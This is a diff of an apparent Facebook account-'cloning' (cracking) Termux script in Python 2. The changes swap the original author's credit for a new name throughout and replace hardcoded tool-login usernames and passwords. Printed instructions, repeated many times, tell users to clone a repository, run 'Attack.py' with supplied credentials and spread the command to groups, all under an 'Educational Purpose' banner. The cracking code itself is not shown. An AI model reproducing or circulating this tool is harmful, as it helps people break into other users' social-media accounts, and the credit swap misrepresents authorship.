@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Tech-Aahil
+#The Credit For This Code Goes To Rdx-vai
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
@@ -18,12 +18,12 @@ for n in range(10000):
 try:
     import requests
 except ImportError:
-    os.system('pip2 install requests')
+    os.system('pip install requests')
     
 try:
     import mechanize
 except ImportError:
-    os.system('pip2 install mechanize')
+    os.system('pip install mechanize')
     time.sleep(1)
     os.system('python2 Cloning.py')
 
@@ -180,7 +180,7 @@ logo12 = """
 ¦-+++++--+¦¦+++++-+-+-+++¦ ¦++++++++¦
 ~?~ ??????¯??(???)??~?~?~ ??????¯??(???)??~?~?~ ??????¯??
  
-\033[1;95m«-----------------\033[1;91mTech-Aahil\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mRdx-vai\033[1;95m-----------------»"""
 logo13 = """
 \033[1;91m  ╱╱╭╮
 \033[1;91m  ╱╱┃┃
@@ -267,7 +267,7 @@ logo22 = """
   \_____|\___/ \__,_| |_.__/ \__, |
                               __/ |
                              |___/ 
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo23 = """
 \033[1;97m    XP-TRICKEE  Report 
 \033[1;97m ____                       _
@@ -277,7 +277,7 @@ logo23 = """
 \033[1;97m|_| \_\___| .__/ \___/|_|   \__|
 \033[1;97m          |_|
 \033[1;97m    jackroo-eng  Report 
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo24 = """
 \033[1;97m jackroo-eng  Information 
 \033[1;97m  ____       _        _ _
@@ -287,7 +287,7 @@ logo24 = """
 \033[1;97m |____/ \___|\__\__,_|_|_|
 \033[1;97m 
 \033[1;97m jackroo-eng  Information 
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo25 = """
 \033[1;97m jackroo-eng  Login 
 \033[1;97m  _             _
@@ -296,8 +296,8 @@ logo25 = """
 \033[1;97m | | (_) | (_| | | | | |
 \033[1;97m |_|\___/ \__, |_|_| |_|
 \033[1;97m          |___/
-\033[1;97m Tech-Aahil  Login 
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m Rdx-vai  Login 
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo26 = """
 \033[1;97m
              ,   ,
@@ -322,7 +322,7 @@ logo26 = """
  $.          .s$$$$$$$$$$$$$$$$$####*
  *$s.   ..ssS$$$$$$$$$$$$$$$$$$$####*
   .$$$S$$$$$$$$$$$$$$$$$$$$$$$$#####*
-\033[1;97m«-----------------\033[1;97m Tech-Aahil \033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai \033[1;97m-----------------»"""
 logo27 = """
 \033[1;97m
 ╔╗──────────╔══╗╔╗───────╔╗────────╔╗──
@@ -348,7 +348,7 @@ logo28 = """
 █▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
 █▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█
 ██████████████████████████████████████████████
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo29 = """
 \033[1;97m
 
@@ -365,7 +365,7 @@ logo29 = """
 █▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
 █▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
 █████████████████████████████████
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo30 = """
 \033[1;97m
 
@@ -375,7 +375,7 @@ logo30 = """
 ██║██║╚████║██║░░██║██║██╔══██║
 ██║██║░╚███║██████╔╝██║██║░░██║
 ╚═╝╚═╝░░╚══╝╚═════╝░╚═╝╚═╝░░╚═╝
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo31 = """
 \033[1;97m
 ╔══╗─╔═══╗╔═══╗╔════╗╔══╗╔╗───
@@ -384,7 +384,7 @@ logo31 = """
 ║╔═╗║║╔╗╔╝║╚═╝║─╔╝╔╝──║║─║║─╔╗
 ║╚═╝║║║║╚╗║╔═╗║╔╝═╚═╗╔╣─╗║╚═╝║
 ╚═══╝╚╝╚═╝╚╝─╚╝╚════╝╚══╝╚═══╝
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo32 = """
 \033[1;97m
 ─╚╝────╔══╗────────
@@ -393,7 +393,7 @@ logo32 = """
 ─║║║╔╗║║╔═╝║╔╗║║╔╗╗
 ╔╝║║╔╗║║║──║╔╗║║║║║
 ╚═╝╚╝╚╝╚╝──╚╝╚╝╚╝╚╝
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo33 = """
 \033[1;97m
 ╔╗╔═╗╔═══╗╔═══╗╔══╗╔═══╗
@@ -402,26 +402,26 @@ logo33 = """
 ║╔╗║─║║─║║║╔╗╔╝─║║─║╚═╝║
 ║║║╚╗║╚═╝║║║║╚╗╔╣─╗║╔═╗║
 ╚╝╚═╝╚═══╝╚╝╚═╝╚══╝╚╝─╚╝
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo34 = """
 \033[1;97m
  ▀ ▀█▀ ▄▀▄ █░░ ▀▄░▄▀
  █ ░█░ █▀█ █░▄ ░░█░░
  ▀ ░▀░ ▀░▀ ▀▀▀ ░░▀░░
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo35 = """
 \033[1;97m
 ▒▄█▀▀█▒▐█▀█░░▄█▀▄─▐██▒██▄░▒█▌
 ▒▀▀█▄▄▒▐█▄█░▐█▄▄▐█░█▌▒▐█▒█▒█░
 ▒█▄▄█▀▒▐█░░░▐█─░▐█▐██▒██░▒██▌
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo36 = """
 \033[1;97m
 ╔═╗───────────────╔╗
 ║╬║╔═╗╔╗─╔═╗─╔═╦╗╔╝║
 ║╔╝║╬║║╚╗║╬╚╗║║║║║╬║
 ╚╝─╚═╝╚═╝╚══╝╚╩═╝╚═╝
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo37 = """
 \033[1;97m
 
@@ -438,26 +438,26 @@ logo37 = """
 █▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
 █▒▒▒▒▒▒█████████▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
 ████████████████████████████████████████████████
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo38 = """
 \033[1;97m
  ▀ █▄░█ █▀▄ ▄▀▄ █▄░█ ▄▀▄ ▄▀▀ ▀ ▄▀▄
  █ █░▀█ █░█ █░█ █░▀█ █▀█ ░▀▄ █ █▀█
  ▀ ▀░░▀ ▀▀░ ░▀░ ▀░░▀ ▀░▀ ▀▀░ ▀ ▀░▀
-\033[1;97m«-----------------\033[1;97m Tech-Aahil \033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai \033[1;97m-----------------»"""
 logo39 = """
 \033[1;97m
  ▄▀▀░ █▀▀▄ █▀▀ ▄▀ █▀▀ █▀▀
  █░▀▌ █▐█▀ █▀▀ █░ █▀▀ █▀▀
  ▀▀▀░ ▀░▀▀ ▀▀▀ ░▀ ▀▀▀ ▀▀▀
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo40 = """
 \033[1;97m
 ╔══╗╔╦╗╔══╗╔══╗╔═╗╔══╗╔╗─╔══╗╔══╗
 ║╔╗║║║║║══╣╚╗╔╝║╬║║╔╗║║║─╚║║╝║╔╗║
 ║╠╣║║║║╠══║─║║─║╗╣║╠╣║║╚╗╔║║╗║╠╣║
 ╚╝╚╝╚═╝╚══╝─╚╝─╚╩╝╚╝╚╝╚═╝╚══╝╚╝╚╝
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo41 = """
 \033[1;97m
 ╔═══╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
@@ -466,13 +466,13 @@ logo41 = """
 ║║─╔╗║╚═╝║║║╚╗║║─║║║║║╚═╝║
 ║╚═╝║║╔═╗║║║─║║║╔╝╚╝║║╔═╗║
 ╚═══╝╚╝─╚╝╚╝─╚═╝╚═══╝╚╝─╚╝
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo42 = """
 \033[1;97m
 ░▐█▀█░▐█░▐█░▐██▒██▄░▒█▌░░▄█▀▄─
 ░▐█──░▐████─░█▌▒▐█▒█▒█░░▐█▄▄▐█
 ░▐█▄█░▐█░▐█░▐██▒██░▒██▌░▐█─░▐█
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo43 = """
 \033[1;97m
 ──╔╗───────────────────╔╗──
@@ -481,7 +481,7 @@ logo43 = """
 ║╔╗║║║═╣║╔╗╗║╚╝║║╔╗║║╔╝║╚╝╝
 ║╚╝║║║═╣║║║║║║║║║╔╗║║║─║╔╗╗
 ╚══╝╚══╝╚╝╚╝╚╩╩╝╚╝╚╝╚╝─╚╝╚╝
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo44 = """
 \033[1;97m
 ─╔═╗───────────────────
@@ -490,7 +490,7 @@ logo44 = """
 ╚╗╔╝║╔╝║╔╗║║╔╗╗║╔═╝║║═╣
 ─║║─║║─║╔╗║║║║║║╚═╗║║═╣
 ─╚╝─╚╝─╚╝╚╝╚╝╚╝╚══╝╚══╝
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo45 = """
 \033[1;97m
 ╔══╗───────────────────╔╗─╔╗
@@ -499,7 +499,7 @@ logo45 = """
 ╚═╗║║║═╣║╔╝║╚╝║║╔╗║║╔╗╗╚═╗╔╝
 ╔═╝║║║═╣║║─║║║║║╔╗║║║║║╔═╝║─
 ╚══╝╚══╝╚╝─╚╩╩╝╚╝╚╝╚╝╚╝╚══╝─
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo46 = """
 \033[1;97m
 ────────╔╗─────╔╗─╔╗──────────
@@ -508,7 +508,7 @@ logo46 = """
 ║╚╝║║╔╗║║║─║╔╗║╚═╗╔╝║══╣─╣║╔╗║
 ║║║║║╔╗║║╚╗║╔╗║╔═╝║──══║║║║╔╗║
 ╚╩╩╝╚╝╚╝╚═╝╚╝╚╝╚══╝─╚══╝╚╝╚╝╚╝
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo47 = """
 \033[1;97m
 ─────────╔╗─────────╔╗──────
@@ -517,7 +517,7 @@ logo47 = """
 ║══╣║╔╝─╣║║─║╔╗║║╔╗╗║╚╝╝║╔╗║
 ─══║║║─║║║╚╗║╔╗║║║║║║╔╗╗║╔╗║
 ╚══╝╚╝─╚╝╚═╝╚╝╚╝╚╝╚╝╚╝╚╝╚╝╚╝
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo48 = """
 \033[1;97m
 ╔════╗╔╗─╔╗╔═══╗╔╗╔═╗╔═══╗╔╗──╔╗
@@ -526,7 +526,7 @@ logo48 = """
 ──║║──║║─║║║╔╗╔╝║╔╗║─║╔══╝─╚╗╔╝─
 ──║║──║╚═╝║║║║╚╗║║║╚╗║╚══╗──║║──
 ──╚╝──╚═══╝╚╝╚═╝╚╝╚═╝╚═══╝──╚╝──
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo49 = """
 \033[1;97m
 ╔╗─╔╗╔═══╗╔═══╗
@@ -535,7 +535,7 @@ logo49 = """
 ║║─║║║╚═╝║║╔══╝
 ║╚═╝║║╔═╗║║╚══╗
 ╚═══╝╚╝─╚╝╚═══╝
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo50 = """
 \033[1;97m
 ──────────╔╗─────────────╔╗────────
@@ -544,7 +544,7 @@ logo50 = """
 ║══╣║║║║║╔╗║─╣║╔╗║║╔╝║╔╗║║╔╗║─╣║╔╗║
 ─══║║╚╝║║╚╝║║║║╔╗║║║─║╔╗║║╚╝║║║║╔╗║
 ╚══╝╚══╝╚══╝╚╝╚╝╚╝╚╝─╚╝╚╝╚══╝╚╝╚╝╚╝
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo51 = """
 \033[1;97m
 ╔══╗╔═══╗╔═══╗╔═══╗╔══╗╔╗───
@@ -553,7 +553,7 @@ logo51 = """
 ─║║─╚══╗║║╔╗╔╝║╚═╝║─║║─║║─╔╗
 ╔╣─╗║╚═╝║║║║╚╗║╔═╗║╔╣─╗║╚═╝║
 ╚══╝╚═══╝╚╝╚═╝╚╝─╚╝╚══╝╚═══╝
-\033[1;97m«-----------------\033[1;97m Tech-Aahil BlackMafia\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97m Rdx-vai BlackMafia\033[1;97m-----------------»"""
 logo52 = """
 \033[1;97m
 ╔══╗╔═══╗╔═══╗╔═╗─╔╗
@@ -562,7 +562,7 @@ logo52 = """
 ─║║─║╔╗╔╝║╚═╝║║║╚╗║║
 ╔╣─╗║║║╚╗║╔═╗║║║─║║║
 ╚══╝╚╝╚═╝╚╝─╚╝╚╝─╚═╝
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 logo53 = """
 \033[1;97m
 0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
@@ -10569,7 +10569,7 @@ a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
    1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
    1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
    1    9   5    0    2   8   6   1   3   0   1   9   0   8
-\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m-----------------»"""
+\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m-----------------»"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -10646,8 +10646,8 @@ jalan("\033[1;93m▇▇\033[1;92m        Termux Data Clear EveryDay    \033[1;93
 jalan("\033[1;93m▇▇\033[1;92m         Facebook Id -- jack vai       \033[1;93m▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
 print "\033[1;95m«-----------------\033[1;91mjackroo-eng\033[1;95m-----------------»"
-CorrectUsername = "Jackroo-eng"
-CorrectPassword = "Janu"
+CorrectUsername = "Rdx"
+CorrectPassword = "RDX"
 
 loop = 'true'
 while (loop == 'true'):
@@ -10655,7 +10655,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:love_hacker
+            print "Logged in successfully as " + username #Dev:Rdx-vai
 	    time.sleep(2)
             loop = 'false'
         else:
@@ -10690,7 +10690,7 @@ def login():
         time.sleep(0.05)
         print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
         time.sleep(0.05)
-        print "\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m---------------»"
+        print "\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m---------------»"
         time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;96m Fast Cloning Without fb id \033[1;97m[New Update]"
         time.sleep(0.05)
@@ -10821,7 +10821,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Tech-Aahil
+	os.system("clear") #Dev:Rdx-vai
         time.sleep(0.05)
 	print logo2
 	print "\033[1;97m    «-------\033[1;97mLogged in User Info\033[1;97m----------»"
@@ -10846,7 +10846,7 @@ def menu():
         time.sleep(0.05)
         print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
         time.sleep(0.05)
-        print "\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m---------------»"
+        print "\033[1;97m«-----------------\033[1;97mRdx-vai\033[1;97m---------------»"
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1 .\x1b[1;96m\033[1;97m Start    Cloning      "
         time.sleep(0.05)
@@ -10908,13 +10908,13 @@ def pilih():
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize') 
-                jalan("\033[1;97mgit clone https://github.com/AahilXP/World")
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize') 
+                jalan("\033[1;97mgit clone https://github.com/Rdx-vaiXP/World")
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser:Aahil')
-                jalan('\033[1;97mpass:Aahil')
+                jalan('\033[1;97mUser:Rdx-vai')
+                jalan('\033[1;97mpass:Rdx-vai')
                 jalan('\033[1;97m👆Copy Command & send 2 groups👆')
                 jalan('\033[1;97mYoutube Chenal Like Subscrib plzz')
                 jalan('\033[1;97m⭕No2⭕')
@@ -10923,35 +10923,35 @@ def pilih():
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name : Aahil')
-                jalan('\033[1;97mPassword   : Aahil')
+                jalan('\033[1;97mUser Name : Rdx-vai')
+                jalan('\033[1;97mPassword   : Rdx-vai')
                 jalan('\033[1;97m⭕No3⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name :  Aahil')
-                jalan('\033[1;97mPassword: Aahil')
+                jalan('\033[1;97mUser Name :  Rdx-vai')
+                jalan('\033[1;97mPassword: Rdx-vai')
                 jalan('\033[1;97m⭕No4⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
                 jalan('\033[1;97m⭕No5⭕')
@@ -10960,200 +10960,200 @@ def pilih():
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No6⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No7⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No8⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No9⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No10⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No11⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No12⭕')
                 jalan('\033[1;97mpkg update')
                 jalan('\033[1;97mpkg upgrade')
                 jalan('\033[1;97mpkg install python')
                 jalan('\033[1;97mpkg install python2')
                 jalan('\033[1;97mpkg install git')
-                jalan('\033[1;97mpip2 install requests')
-                jalan('\033[1;97mpip2 install mechanize')
-                jalan('\033[1;97mgit clone https://github.com/AahilXP/World')
+                jalan('\033[1;97mpip install requests')
+                jalan('\033[1;97mpip install mechanize')
+                jalan('\033[1;97mgit clone https://github.com/Rdx-vaiXP/World')
                 jalan('\033[1;97mcd World')
                 jalan('\033[1;97mpython2 Attack.py')
-                jalan('\033[1;97mUser Name:Aahil')
-                jalan('\033[1;97mPassword  :Aahil')
+                jalan('\033[1;97mUser Name:Rdx-vai')
+                jalan('\033[1;97mPassword  :Rdx-vai')
                 jalan('\033[1;97m⭕No13⭕')
                 jalan('\033[1;97mpkg update')
